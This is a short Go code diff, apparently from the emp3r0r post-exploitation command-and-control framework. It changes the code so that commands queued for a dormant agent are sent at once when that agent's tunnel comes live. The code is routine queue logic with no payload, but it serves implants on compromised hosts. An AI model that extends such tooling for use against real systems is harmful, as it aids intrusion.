@@ -67,6 +67,12 @@ func sendAgentCommandOrQueue(cmd, jobID string, agent *def.Emp3r0rAgent) error {
 		Time:     time.Now().UnixMilli(),
 	})
 	logging.Debugf("Agent %s is dormant; queued %q for its next check-in", agent.Tag, cmd)
+	// If the tunnel finished its handshake and became live while we were
+	// enqueuing, drain immediately so the command does not wait for the next
+	// reconnect.
+	if _, ctrl, ok := agents.RuntimeControlByUUID(agent.UUID); ok && ctrl != nil && ctrl.Conn != nil {
+		drainQueuedCommands(agent.UUID, cbor.NewEncoder(ctrl.Conn))
+	}
 	return nil
 }
 
